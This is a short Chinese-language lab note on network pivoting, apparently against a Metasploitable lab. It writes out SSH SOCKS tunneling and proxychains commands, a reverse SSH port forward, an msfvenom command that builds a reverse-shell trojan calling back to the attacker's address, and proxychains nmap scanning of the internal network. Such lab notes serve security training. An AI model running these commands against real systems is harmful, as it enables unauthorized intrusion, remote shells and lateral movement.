# Linux Tunnel
## 操作步驟
### 操作前準備及注意事項
- 準備3台機器
    - 攻擊機
    - 跳板機
    - 內網機器
##  操作中步驟(皆在攻擊機操作)
- 先建ssh tunnel，指令: ssh -oHostKeyAlgorithms=+ssh-dss -D 9050  msfadmin@192.168.182.131
- 開啟另一個終端機介面
- 先編輯 proxychains的config
- nano /etc/proxychains4.conf
- 把socks4  127.0.0.1 {指定的port}加到最後一行
- proxychains  ssh msfadmin@192.168.11.4  -oHostKeyAlgorithms=+ssh-dss
- 如須回連reverse shell須按下列步驟操作
    - 攻擊機: ssh -R {listen_IP}:{host}:{host_IP} user@IP
    - 準備trojan: msfvenom -p linux/x86/shell_reverse_tcp -f elf --platform linux -a x86 -e generic/none LHOST=192.168.11.9 LPORT=7777  > aaa.elf 
    - 把trojan送至內網機裡
    - trigger
    - 即可連回shell

## 操作後步驟及注意事項
- 取得內網機器的權限，可於自己的kali直接連接內網的機器
- 透過proxychains nmap掃描即可掃描內網機器

## 指令範例
- proxychains ssh 192.168.11.4
- ![](https://i.imgur.com/4E5bieZ.png)
- ![](https://i.imgur.com/RaqqKbD.png)
- reverse shell回連
- ![](https://i.imgur.com/OuBVnuK.png)




